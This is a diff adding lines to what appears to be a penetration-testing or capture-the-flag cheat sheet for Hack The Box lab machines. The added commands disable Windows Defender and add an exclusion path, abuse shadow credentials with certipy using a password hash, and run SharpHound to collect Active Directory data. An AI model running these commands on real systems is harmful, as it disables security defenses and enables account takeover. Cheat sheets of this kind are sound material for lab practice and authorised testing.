@@ -8,6 +8,15 @@ for i in { 1..255 };do ping -c 1 192.168.110.$i > /dev/null; if [ $? -eq 0 ];the
 # PIVOT
 sudo sshuttle -r riley@10.10.110.35 192.168.110.0/24 -v		# Pivoting # SSH
 
+# DEFENDER
+add-mppreference -ExclusionPath C:\temp		# Add an exclusion path # Defender
+set-mppreference -DisableRealTimeMonitoring $true		# Disable windows defender
+
+certipy-ad shadow auto -username "Haze-IT-Backup$"@haze.htb -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -account edward.martin -target haze.htb -dc-ip 10.129.9.88		# instead pywhiskers
+
+# BloodHound Ingestors
+ShatpHound.exe --outputdirectory C:\temp --ldapusername riley --ldappassword "password"		# bloodhound # ingest with sharphound
+
 # ACTIVE DIRECTORY
 
 # ENUMERATE USERS (READ ONLY $IPC)
